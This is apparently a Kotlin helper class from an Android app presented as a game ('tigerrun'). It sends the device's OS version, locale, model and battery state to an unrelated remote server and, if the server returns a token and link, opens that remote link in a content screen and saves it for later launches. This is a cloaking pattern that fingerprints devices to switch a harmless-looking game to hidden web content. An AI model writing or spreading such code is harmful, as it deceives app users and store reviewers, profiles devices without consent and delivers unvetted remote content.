package com.games.tigerrun.dgnvm

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.BatteryManager
import android.os.Build
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.net.HttpURLConnection
import java.net.URL
import java.util.*

class ServerHelper(private val context: Context) {
    
    private val dataManager = DataManager(context)
    
    suspend fun checkServerAndProceed(onResult: (Boolean) -> Unit) = withContext(Dispatchers.IO) {
        try {
            val osVersion = "Android%20${Build.VERSION.RELEASE}"
            val language = Locale.getDefault().language
            val region = Locale.getDefault().country
            val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}".replace(" ", "%20")
            val batteryStatus = getBatteryStatus()
            val batteryLevel = "%.2f".format(Locale.US, getBatteryLevel())

            val requestPath = "https://wallen-eatery.space/a-vdm-1/server.php?" +
                    "p=Jh675eYuunk85" +
                    "&os=$osVersion" +
                    "&lng=$language" +
                    "&loc=$region" +
                    "&devicemodel=$deviceModel" +
                    "&bs=$batteryStatus" +
                    "&bl=$batteryLevel"

            val connection = URL(requestPath).openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.connectTimeout = 10000
            connection.readTimeout = 10000
            
            val responseCode = connection.responseCode
            if (responseCode == HttpURLConnection.HTTP_OK) {
                val response = connection.inputStream.bufferedReader().use { it.readText() }
                
                if (response.contains("#")) {
                    val parts = response.split("#", limit = 2)
                    val token = parts[0]
                    val link = parts[1]
                    
                    dataManager.saveAccessToken(token)
                    dataManager.saveContentPath(link)
                    
                    withContext(Dispatchers.Main) {
                        onResult(true)
                        openContentViewer(link)
                    }
                } else {
                    withContext(Dispatchers.Main) {
                        onResult(false)
                    }
                }
            } else {
                withContext(Dispatchers.Main) {
                    onResult(false)
                }
            }
            
            connection.disconnect()
        } catch (e: Exception) {
            withContext(Dispatchers.Main) {
                onResult(false)
            }
        }
    }
    
    fun checkSavedDataAndOpen(): Boolean {
        if (dataManager.hasAccessToken()) {
            val savedPath = dataManager.getContentPath()
            if (!savedPath.isNullOrEmpty()) {
                openContentViewer(savedPath)
                return true
            }
        }
        return false
    }
    
    private fun openContentViewer(address: String) {
        val intent = Intent(context, ContentActivity::class.java)
        intent.putExtra("CONTENT_LINK", address)
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
        context.startActivity(intent)
    }
    
    private fun getBatteryStatus(): String {
        val batteryFilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        val batteryIntent = context.registerReceiver(null, batteryFilter)
        val status = batteryIntent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        return when (status) {
            BatteryManager.BATTERY_STATUS_CHARGING -> "Charging"
            BatteryManager.BATTERY_STATUS_DISCHARGING -> "Discharging"
            BatteryManager.BATTERY_STATUS_NOT_CHARGING -> "NotCharging"
            BatteryManager.BATTERY_STATUS_FULL -> "Full"
            else -> "Unknown"
        }
    }
    
    private fun getBatteryLevel(): Float {
        val batteryFilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        val batteryIntent = context.registerReceiver(null, batteryFilter)
        val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        return if (level >= 0 && scale > 0) {
            level.toFloat() / scale.toFloat()
        } else {
            -1f
        }
    }
}

